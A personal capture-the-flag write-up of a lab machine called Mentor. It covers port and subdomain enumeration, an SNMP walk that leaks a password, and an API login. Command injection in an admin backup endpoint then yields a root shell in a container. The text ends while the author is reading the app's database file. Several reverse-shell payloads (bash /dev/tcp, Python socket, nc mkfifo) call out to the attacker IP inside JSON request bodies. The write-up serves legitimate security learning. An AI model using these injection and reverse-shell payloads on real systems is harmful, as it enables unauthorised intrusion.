## Intro

tags: #OSCPpath #linux #api #SNMP #pivot #docker #known-binary #medium

took me 5 hours with hints.. practice api stuff more

---
# Reconnaissance

```shell
source basher target1 10.129.228.102 [IP]
source basher host1 mentor.htb [host]

echo "$target1 $host1" | sudo tee -a /etc/hosts
```

### Identify open  TCP ports fast
```shell
sudo nmap -p- --open -sS --min-rate 5000 -Pn -n $target1
```

```shell
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-22 07:24 -0400
Nmap scan report for 10.129.228.102
Host is up (0.092s latency).
Not shown: 59573 closed tcp ports (reset), 5960 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 20.28 seconds
```

### Scan specific open TCP ports
```shell
sudo nmap -p22,80 -A $target1
```

```shell
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-22 07:25 -0400
Nmap scan report for jarvis.htb (10.129.228.102)
Host is up (0.047s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c7:3b:fc:3c:f9:ce:ee:8b:48:18:d5:d1:af:8e:c2:bb (ECDSA)
|_  256 44:40:08:4c:0e:cb:d4:f1:8e:7e:ed:a8:5c:68:a4:f7 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://mentorquotes.htb/
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: Host: mentorquotes.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   46.65 ms 10.10.14.1

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.08 seconds
```

### Identify open UDP ports

```shell
sudo nmap -p- --open -sU --min-rate 5000 -Pn -n $target1
```

```shell
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-22 09:08 -0400
Warning: 10.129.228.102 giving up on port because retransmission cap hit (10).
Stats: 0:00:32 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 22.63% done; ETC: 09:10 (0:01:53 remaining)
Stats: 0:00:32 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 22.64% done; ETC: 09:10 (0:01:53 remaining)
Nmap scan report for 10.129.228.102
Host is up (0.090s latency).
Not shown: 65385 open|filtered udp ports (no-response), 149 closed udp ports (port-unreach)
PORT    STATE SERVICE
161/udp open  snmp

Nmap done: 1 IP address (1 host up) scanned in 145.46 seconds
```
lets keep it in mind for later and lets start with the most obvious path

## Webapp

trying to navigate to `mentor.htb` it redirects to `mentorquotes.htb` so lets add it to etc hosts and try again

![](MediaFiles/Pasted%20image%2020260922143436.png)
no versions found on page source , not clickable pages, lets enumerate

## Directories

```shell
gobuster dir -k -u http://mentorquotes.htb -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```
nothing

### Files

```shell
gobuster dir -e -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://mentorquotes.htb/ -x asp,aspx,cgi,htm,html,js,json,jsp,php,pl,py,sh -b 403,404
```
nothing

## Vhosts enumeration

```shell
curl -s http://mentorquotes.htb | wc -c
230
```

```shell
gobuster vhost -u http://mentorquotes.htb \
  -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt --append-domain --exclude-length 5506 -t 50
```
nothing found

## Subdomains

```shell
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
  -u http://mentorquotes.htb/ \
  -H "Host: FUZZ.mentorquotes.htb" \
  -mc 200
```
nothing found

lets try with this
```shell
wfuzz -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H 'Host:FUZZ.mentorquotes.htb' --hw=26 -u http://mentorquotes.htb
```
found this 
```shell
Target: http://mentorquotes.htb/
Total requests: 100000

=====================================================================
ID           Response   Lines    Word       Chars       Payload        
=====================================================================

000000040:   404        0 L      2 W        22 Ch       "api"          
000001612:   302        9 L      26 W       294 Ch      "pc9"          

Total time: 18.62263
Processed Requests: 1634
Filtered Requests: 1633
Requests/sec.: 87.74269
```
interesting, `api` lets add it to hosts and try enumerating that too

## API found

### Scan for API endpoints

```shell
feroxbuster -u http://api.mentorquotes.htb
```

```shell
404      GET        1l        2w       22c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
307      GET        0l        0w        0c http://api.mentorquotes.htb/admin => http://api.mentorquotes.htb/admin/
200      GET       69l      212w     2637c http://api.mentorquotes.htb/docs/oauth2-redirect
307      GET        0l        0w        0c http://api.mentorquotes.htb/docs/ => http://api.mentorquotes.htb/docs
200      GET        1l       48w     7676c http://api.mentorquotes.htb/openapi.json
200      GET       31l       62w      969c http://api.mentorquotes.htb/docs
307      GET        0l        0w        0c http://api.mentorquotes.htb/users => http://api.mentorquotes.htb/users/
405      GET        1l        3w       31c http://api.mentorquotes.htb/admin/backup
307      GET        0l        0w        0c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
405      GET        1l        3w       31c http://api.mentorquotes.htb/users/add
422      GET        1l        3w      186c http://api.mentorquotes.htb/admin/check
[####################] - 2m    120005/120005  0s      found:9       errors:9839   
[####################] - 2m     30000/30000   216/s   http://api.mentorquotes.htb/ 
[####################] - 2m     30000/30000   217/s   http://api.mentorquotes.htb/admin/ 
[####################] - 2m     30000/30000   217/s   http://api.mentorquotes.htb/users/ => Wildcard dir! stopped recursion
[####################] - 2m     30000/30000   218/s   http://api.mentorquotes.htb/quotes/ => Wildcard dir! stopped recursion 
```
found
```
http://api.mentorquotes.htb/admin/
http://api.mentorquotes.htb/docs/
http://api.mentorquotes.htb/users/
http://api.mentorquotes.htb/openapi.json
```
lets view some of those

the json is interesting, it basically describes all its components, it seems we can login and sinup via the api , post stuff etc
![](MediaFiles/Pasted%20image%2020260922153215.png)

![](MediaFiles/Pasted%20image%2020260922153145.png)
lets view the `/docs` to see the documentation and find out how to use it
```
http://api.mentorquotes.htb/docs
```
lets try an example, lets `register` a user
```json
{
  "email": "ch3ckm8@example.com",
  "username": "ch3ckm8",
  "password": "p4ssw0rd",
}
```
![](MediaFiles/Pasted%20image%2020260922155818.png)
it was successful, now lets `login`, did that similarly but after that nothing interesting found

## SNMP enum

```shell
snmp-check 10.129.228.102
```

```shell
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 10.129.228.102:161 using SNMPv1 and community 'public'

[*] System information:

  Host IP address               : 10.129.228.102
  Hostname                      : mentor
  Description                   : Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64
  Contact                       : Me <admin@mentorquotes.htb>
  Location                      : Sitting on the Dock of the Bay
  Uptime snmp                   : 01:53:15.92
  Uptime system                 : 01:53:03.22
  System date                   : 2026-9-22 13:16:43.0

```
nothing interesting tilets check write access too with `-w`
```shell
└─$ snmp-check 10.129.228.102 -w
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 10.129.228.102:161 using SNMPv1 and community 'public'
[+] Write access check enabled

[*] Write access not permitted!
[*] System information:

  Host IP address               : 10.129.228.102
  Hostname                      : mentor
  Description                   : Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64
  Contact                       : Me <admin@mentorquotes.htb>
  Location                      : Sitting on the Dock of the Bay
  Uptime snmp                   : 01:54:46.77
  Uptime system                 : 01:54:34.06
  System date                   : 2026-9-22 13:18:13.0
```
even disabling tcp with `-d` didnt work
```shell
─$ snmp-check 10.129.228.102 -d
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 10.129.228.102:161 using SNMPv1 and community 'public'
[+] TCP connections enumeration disabled

[*] System information:

  Host IP address               : 10.129.228.102
  Hostname                      : mentor
  Description                   : Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64
  Contact                       : Me <admin@mentorquotes.htb>
  Location                      : Sitting on the Dock of the Bay
  Uptime snmp                   : 01:56:40.84
  Uptime system                 : 01:56:28.13
  System date                   : 2026-9-22 13:20:08.0

```
lets try other tools
```shell
snmpbulkwalk -v2c -c internal 10.129.228.102
```
thats much more output, inside i found these lines
```
iso.3.6.1.2.1.1.1.0 = STRING: "Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (721582) 2:00:15.82
iso.3.6.1.2.1.1.4.0 = STRING: "Me <admin@mentorquotes.htb>"
iso.3.6.1.2.1.1.5.0 = STRING: "mentor"
iso.3.6.1.2.1.1.6.0 = STRING: "Sitting on the Dock of the Bay"
```

```shell
iso.3.6.1.2.1.25.4.2.1.4.763 = STRING: "/lib/systemd/systemd-resolved"
iso.3.6.1.2.1.25.4.2.1.4.764 = STRING: "/lib/systemd/systemd-timesyncd"
iso.3.6.1.2.1.25.4.2.1.4.779 = STRING: "/usr/bin/VGAuthService"
iso.3.6.1.2.1.25.4.2.1.4.782 = STRING: "/usr/bin/vmtoolsd"
iso.3.6.1.2.1.25.4.2.1.4.804 = STRING: "/sbin/dhclient"
iso.3.6.1.2.1.25.4.2.1.4.854 = STRING: "@dbus-daemon"
iso.3.6.1.2.1.25.4.2.1.4.859 = STRING: "/usr/sbin/irqbalance"
iso.3.6.1.2.1.25.4.2.1.4.861 = STRING: "/usr/bin/python3"
iso.3.6.1.2.1.25.4.2.1.4.862 = STRING: "/usr/libexec/polkitd"
iso.3.6.1.2.1.25.4.2.1.4.863 = STRING: "/usr/sbin/rsyslogd"
iso.3.6.1.2.1.25.4.2.1.4.866 = STRING: "/usr/lib/snapd/snapd"
iso.3.6.1.2.1.25.4.2.1.4.867 = STRING: "/lib/systemd/systemd-logind"
iso.3.6.1.2.1.25.4.2.1.4.869 = STRING: "/usr/libexec/udisks2/udisksd"
iso.3.6.1.2.1.25.4.2.1.4.918 = STRING: "/usr/sbin/ModemManager"
iso.3.6.1.2.1.25.4.2.1.4.1191 = STRING: "/usr/sbin/cron"
iso.3.6.1.2.1.25.4.2.1.4.1193 = STRING: "/usr/sbin/snmpd"
iso.3.6.1.2.1.25.4.2.1.4.1199 = STRING: "/usr/bin/containerd"
iso.3.6.1.2.1.25.4.2.1.4.1227 = STRING: "/sbin/agetty"
iso.3.6.1.2.1.25.4.2.1.4.1234 = STRING: "sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups"
iso.3.6.1.2.1.25.4.2.1.4.1254 = STRING: "/usr/sbin/apache2"
iso.3.6.1.2.1.25.4.2.1.4.1319 = STRING: "/usr/bin/dockerd"
iso.3.6.1.2.1.25.4.2.1.4.1690 = STRING: "/bin/bash"
iso.3.6.1.2.1.25.4.2.1.4.1738 = STRING: "/usr/bin/docker-proxy"
iso.3.6.1.2.1.25.4.2.1.4.1752 = STRING: "/usr/bin/containerd-shim-runc-v2"
iso.3.6.1.2.1.25.4.2.1.4.1771 = STRING: "postgres"
iso.3.6.1.2.1.25.4.2.1.4.1853 = STRING: "/usr/bin/docker-proxy"
iso.3.6.1.2.1.25.4.2.1.4.1867 = STRING: "/usr/bin/containerd-shim-runc-v2"
iso.3.6.1.2.1.25.4.2.1.4.1890 = STRING: "python3"
iso.3.6.1.2.1.25.4.2.1.4.1934 = STRING: "postgres: checkpointer "
iso.3.6.1.2.1.25.4.2.1.4.1935 = STRING: "postgres: background writer "
iso.3.6.1.2.1.25.4.2.1.4.1936 = STRING: "postgres: walwriter "
iso.3.6.1.2.1.25.4.2.1.4.1937 = STRING: "postgres: autovacuum launcher "
iso.3.6.1.2.1.25.4.2.1.4.1938 = STRING: "postgres: stats collector "
iso.3.6.1.2.1.25.4.2.1.4.1939 = STRING: "postgres: logical replication launcher "
iso.3.6.1.2.1.25.4.2.1.4.1969 = STRING: "/usr/bin/docker-proxy"
iso.3.6.1.2.1.25.4.2.1.4.1986 = STRING: "/usr/bin/containerd-shim-runc-v2"
iso.3.6.1.2.1.25.4.2.1.4.2006 = STRING: "python"
iso.3.6.1.2.1.25.4.2.1.4.2055 = STRING: "/usr/local/bin/python3"
iso.3.6.1.2.1.25.4.2.1.4.2056 = STRING: "/usr/local/bin/python3"
iso.3.6.1.2.1.25.4.2.1.4.2069 = STRING: "postgres: postgres mentorquotes_db 172.22.0.1(55122) idle"
iso.3.6.1.2.1.25.4.2.1.4.2070 = STRING: "postgres: postgres mentorquotes_db 172.22.0.1(55128) idle"
iso.3.6.1.2.1.25.4.2.1.4.2083 = STRING: "/usr/bin/python3"
iso.3.6.1.2.1.25.4.2.1.4.248997 = ""
iso.3.6.1.2.1.25.4.2.1.4.267703 = STRING: "/usr/sbin/apache2"
iso.3.6.1.2.1.25.4.2.1.4.267731 = STRING: "/usr/sbin/apache2"
iso.3.6.1.2.1.25.4.2.1.4.267759 = STRING: "/usr/sbin/apache2"
iso.3.6.1.2.1.25.4.2.1.4.267863 = ""
iso.3.6.1.2.1.25.4.2.1.4.267867 = STRING: "/usr/libexec/fwupd/fwupd"
iso.3.6.1.2.1.25.4.2.1.4.267872 = STRING: "/usr/libexec/upowerd"
```

```shell
iso.3.6.1.2.1.25.4.2.1.5.804 = STRING: "-1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0"
iso.3.6.1.2.1.25.4.2.1.5.854 = STRING: "--system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only"
iso.3.6.1.2.1.25.4.2.1.5.859 = STRING: "--foreground"
iso.3.6.1.2.1.25.4.2.1.5.861 = STRING: "/usr/bin/networkd-dispatcher --run-startup-triggers"
iso.3.6.1.2.1.25.4.2.1.5.862 = STRING: "--no-debug"
iso.3.6.1.2.1.25.4.2.1.5.863 = STRING: "-n -iNONE"
iso.3.6.1.2.1.25.4.2.1.5.866 = ""
iso.3.6.1.2.1.25.4.2.1.5.867 = ""
iso.3.6.1.2.1.25.4.2.1.5.869 = ""
iso.3.6.1.2.1.25.4.2.1.5.918 = ""
iso.3.6.1.2.1.25.4.2.1.5.1191 = STRING: "-f -P"
iso.3.6.1.2.1.25.4.2.1.5.1193 = STRING: "-LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f"
iso.3.6.1.2.1.25.4.2.1.5.1199 = ""
iso.3.6.1.2.1.25.4.2.1.5.1227 = STRING: "-o -p -- \\u --noclear tty1 linux"
iso.3.6.1.2.1.25.4.2.1.5.1234 = ""
iso.3.6.1.2.1.25.4.2.1.5.1254 = STRING: "-k start"
iso.3.6.1.2.1.25.4.2.1.5.1319 = STRING: "-H fd:// --containerd=/run/containerd/containerd.sock"
iso.3.6.1.2.1.25.4.2.1.5.1690 = STRING: "/usr/local/bin/login.sh"
iso.3.6.1.2.1.25.4.2.1.5.1738 = STRING: "-proto tcp -host-ip 172.22.0.1 -host-port 5432 -container-ip 172.22.0.4 -container-port 5432"
iso.3.6.1.2.1.25.4.2.1.5.1752 = STRING: "-namespace moby -id 96e44c5692920491cdb954f3d352b3532a88425979cd48b3959b63bfec98a6f4 -address /run/containerd/containerd.sock"
iso.3.6.1.2.1.25.4.2.1.5.1771 = ""
iso.3.6.1.2.1.25.4.2.1.5.1853 = STRING: "-proto tcp -host-ip 172.22.0.1 -host-port 8000 -container-ip 172.22.0.3 -container-port 8000"
iso.3.6.1.2.1.25.4.2.1.5.1867 = STRING: "-namespace moby -id 99a4440dbe1795e5acc0c987e3076da33ea931a1d9ea2c3c72af25ea49af8a3f -address /run/containerd/containerd.sock"
iso.3.6.1.2.1.25.4.2.1.5.1890 = STRING: "-m uvicorn app.main:app --reload --workers 2 --host 0.0.0.0 --port 8000"
iso.3.6.1.2.1.25.4.2.1.5.1934 = ""
iso.3.6.1.2.1.25.4.2.1.5.1935 = ""
iso.3.6.1.2.1.25.4.2.1.5.1936 = ""
iso.3.6.1.2.1.25.4.2.1.5.1937 = ""
iso.3.6.1.2.1.25.4.2.1.5.1938 = ""
iso.3.6.1.2.1.25.4.2.1.5.1939 = ""
iso.3.6.1.2.1.25.4.2.1.5.1969 = STRING: "-proto tcp -host-ip 172.22.0.1 -host-port 81 -container-ip 172.22.0.2 -container-port 80"
iso.3.6.1.2.1.25.4.2.1.5.1986 = STRING: "-namespace moby -id 12512fe64ac1c61f226da5bcea2a677f53028bc42e3aa7a48179e8ea5040dc29 -address /run/containerd/containerd.sock"
iso.3.6.1.2.1.25.4.2.1.5.2006 = STRING: "main.py"
iso.3.6.1.2.1.25.4.2.1.5.2055 = STRING: "-c from multiprocessing.semaphore_tracker import main;main(4)"
iso.3.6.1.2.1.25.4.2.1.5.2056 = STRING: "-c from multiprocessing.spawn import spawn_main; spawn_main(tracker_fd=5, pipe_handle=7) --multiprocessing-fork"
iso.3.6.1.2.1.25.4.2.1.5.2069 = ""
iso.3.6.1.2.1.25.4.2.1.5.2070 = ""
iso.3.6.1.2.1.25.4.2.1.5.2083 = STRING: "/usr/local/bin/login.py kj23sadkj123as0-d213"
iso.3.6.1.2.1.25.4.2.1.5.248997 = ""
iso.3.6.1.2.1.25.4.2.1.5.267703 = STRING: "-k start"
iso.3.6.1.2.1.25.4.2.1.5.267731 = STRING: "-k start"
iso.3.6.1.2.1.25.4.2.1.5.267759 = STRING: "-k start"
```
this snippet here
```shell
iso.3.6.1.2.1.25.4.2.1.5.2090 = STRING: "/usr/local/bin/login.py kj23sadkj123as0-d213"
```
seems like a password
```
kj23sadkj123as0-d213
```

okay now since nothing appears obvious and we dont know any valid users,
or maybe we do know? check the docs page again
![](MediaFiles/Pasted%20image%2020260922164035.png)
we are given a user: james. lets try this password on james user via ssh, but did not work

soo lets hop back on the API situation

## API usage

when i logged in, there was this output, which seems like a session token
![](MediaFiles/Pasted%20image%2020260922164649.png)
```
"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImNoM2NrbTgiLCJlbWFpbCI6ImNoM2NrbThAZXhhbXBsZS5jb20ifQ.DKnfdflJ7vIHPbFbaOxA2zARQRs8Q8fmRkSb3pFgKc8"
```
so right now we know:
```
james
kj23sadkj123as0-d213
```
we also have a valid user we created `ch3ckm8` and it's session token

but what if we try login in via the api as james? lets try by taking the curl command from the docs page
```shell
curl -X 'POST' \
  'http://api.mentorquotes.htb/auth/login' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "email": "james@mentorquotes.htb",
  "username": "james",
  "password": "kj23sadkj123as0-d213"
}'
```
received a session token
```shell
"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0"
```

## Enumerating the api

```shell
curl -X GET http://api.mentorquotes.htb/users/ -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0' | jq
```
response
```shell
[
  {
    "id": 1,
    "email": "james@mentorquotes.htb",
    "username": "james"
  },
  {
    "id": 2,
    "email": "svc@mentorquotes.htb",
    "username": "service_acc"
  },
  {
    "id": 4,
    "email": "ch3ckm8@example.com",
    "username": "ch3ckm8"
  }
]
```

lets try other endpoints like `/admin` and `/admin/backup`
```shell
curl -X GET http://api.mentorquotes.htb/admin/ -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0' | jq
```

```shell
{
  "admin_funcs": {
    "check db connection": "/check",
    "backup the application": "/backup"
  }
}
```
lets try backup too
with `post`
```shell
curl -X POST http://api.mentorquotes.htb/admin/backup -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0' | jq
```

```shell
{
  "detail": [
    {
      "loc": [
        "body"
      ],
      "msg": "field required",
      "type": "value_error.missing"
    }
  ]
}
```

with `get`
```shell
curl -X GET http://api.mentorquotes.htb/admin/backup -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0' | jq
```

```shell
{
  "detail": "Method Not Allowed"
}
```
hm lets go back on the `openapi.json` file to see if we can find whats wrong
going there nothing can be found about /admin/backup, hmm 

the post requests saus that field required and type value_error missing, so sth is missing here, but what is it?

but lets take a look at this again
```shell
{
  "detail": [
    {
      "loc": [
        "body"
      ],
      "msg": "field required",
      "type": "value_error.missing"
    }
  ]
}
```
it requires a body, so what if we ad a {} at the end of the body
```shell
curl -X POST http://api.mentorquotes.htb/admin/backup \
  -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0' \
  -H 'Content-Type: application/json' \
  -d '{}' | jq
```
now we get a different result!
```json
{
  "detail": [
    {
      "loc": [
        "body",
        "path"
      ],
      "msg": "field required",
      "type": "value_error.missing"
    }
  ]
}
```
thats great! lets try speficying any path there
```shell
curl -X POST http://api.mentorquotes.htb/admin/backup \
  -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0' \
  -H 'Content-Type: application/json' \
  -d '{"path":"ch3ckm8"}' | jq
```
nomatter the path value, we get:
```shell
{
  "INFO": "Done!"
}
```
so what now? well since we input some path and it seems to receive it successfully, we could try command injection

## Command injection

### test

lets try injecting commands like this
```shell
ch3ckm8;bash -c 'bash -i >%26 /dev/tcp/10.10.14.247/4444 0>%261';
```

```shell
curl -X POST http://api.mentorquotes.htb/admin/backup \
  -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0' \
  -H 'Content-Type: application/json' \
  -d '{"path":"ch3ckm8;bash -i >%26 /dev/tcp/10.10.14.247/4444 0>%261;"}' | jq
```
although it says done on the response, directly rev shell doesnt work

lets try via python tho
```shell
{"path": ";python -c 'import os,pty,socket;s=socket.socket();s.connect((\"10.10.14.247\",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")';"}
```
or
```shell
"path": "test;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.247 4443 >/tmp/f;"
```

```shell
curl -X POST http://api.mentorquotes.htb/admin/backup \
  -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0' \
  -H 'Content-Type: application/json' \
  -d '{"path": "ch3ckm8;python -c '\''import os,pty,socket;s=socket.socket();s.connect((\"10.10.14.247\",4443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")'\'';"}' | jq
```
got shell back!
```shell
└─$ nc -lvnp 4444                                                                                                                           
listening on [any] 4444 ...
connect to [10.10.14.247] from (UNKNOWN) [10.129.228.102] 33692
/app # ^[[33;8Rpython3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
Traceback (most recent call last):
  File "<string>", line 1, in <module>
  File "/usr/local/lib/python3.6/pty.py", line 156, in spawn
    os.execlp(argv[0], *argv)
  File "/usr/local/lib/python3.6/os.py", line 542, in execlp
    execvp(file, args)
  File "/usr/local/lib/python3.6/os.py", line 559, in execvp
    _execvpe(file, args)
  File "/usr/local/lib/python3.6/os.py", line 583, in _execvpe
    exec_func(file, *argrest)
FileNotFoundError: [Errno 2] No such file or directory
/app # ^[[33;8R

```
this worked better:
```shell
$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.247 4445 >/tmp/f)
```

```shell
curl -X POST http://api.mentorquotes.htb/admin/backup \
  -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0' \
  -H 'Content-Type: application/json' \
  -d '{"path":"$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.247 4445 >/tmp/f)"}' | jq
```

## Shell as root on container 0bbdc2c4fc86
```shell
└─$ nc -lvnp 4445                                                                                                                           
listening on [any] 4445 ...
connect to [10.10.14.247] from (UNKNOWN) [10.129.72.226] 36455
sh: can't access tty; job control turned off
/app # id 
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
/app # whoami
root
/app # ls /home
svc
/app # cat /home/svc/user.txt
27a7d06185e0bbf525179ec579247186
/app # hostname
0bbdc2c4fc86
/app # 

```

## Filesystem enumeration

we know we are inside a container due to the hostname being like a random string, also proven by `.dockerenv` on root dir:

```shell
/app # cd /
/ # ls -la
total 172
drwxr-xr-x    1 root     root          4096 Sep 22 15:54 .
drwxr-xr-x    1 root     root          4096 Sep 22 15:54 ..
-rwxr-xr-x    1 root     root             0 Sep 22 15:54 .dockerenv
drwxr-xr-x    3 root     root          4096 Dec 11  2022 API
drwxr-xr-x    1 root     root          4096 Nov 10  2022 app
-rw-r--r--    1 root     root        101888 Dec 11  2022 app_backkup.tar
drwxr-xr-x    1 root     root          4096 Jun  8  2022 bin
drwxr-xr-x    5 root     root           340 Sep 22 15:54 dev
drwxr-xr-x    1 root     root          4096 Sep 22 15:54 etc
drwxr-xr-x    1 root     root          4096 Nov 10  2022 home
drwxr-xr-x    1 root     root          4096 Jun  8  2022 lib
drwxr-xr-x    5 root     root          4096 Nov 10  2022 media
drwxr-xr-x    2 root     root          4096 Nov 10  2022 mnt
drwxr-xr-x    2 root     root          4096 Nov 10  2022 opt
dr-xr-xr-x  298 root     root             0 Sep 22 15:54 proc
drwx------    2 root     root          4096 Nov 10  2022 root
drwxr-xr-x    2 root     root          4096 Nov 10  2022 run
drwxr-xr-x    2 root     root          4096 Nov 10  2022 sbin
drwxr-xr-x    2 root     root          4096 Nov 10  2022 srv
dr-xr-xr-x   13 root     root             0 Sep 22 15:54 sys
drwxrwxrwt    1 root     root          4096 Sep 22 15:56 tmp
drwxr-xr-x    1 root     root          4096 Nov 10  2022 usr
drwxr-xr-x    1 root     root          4096 Nov 10  2022 var
```

```shell
/app # cat Dockerfile
FROM python:3.6.9-alpine

RUN apk --update --upgrade add --no-cache  gcc musl-dev jpeg-dev zlib-dev libffi-dev cairo-dev pango-dev gdk-pixbuf-dev

WORKDIR /app
ENV HOME /home/svc
ENV PATH /home/svc/.local/bin:${PATH}
RUN python -m pip install --upgrade pip --user svc
COPY requirements.txt requirements.txt
RUN pip install -r requirements.txt
RUN pip install pydantic[email] pyjwt
EXPOSE 8000
COPY . .
CMD ["python3", "-m", "uvicorn", "app.main:app", "--reload", "--workers", "100", "--host", "0.0.0.0", "--port" ,"8000"]
```

```shell
/app/app # cat db.py
import os

from sqlalchemy import (Column, DateTime, Integer, String, Table, create_engine, MetaData)
from sqlalchemy.sql import func
from databases import Database

# Database url if none is passed the default one is used
DATABASE_URL = os.getenv("DATABASE_URL", "postgresql://postgres:postgres@172.22.0.1/mentorquotes_db")

# SQLAlchemy for quotes
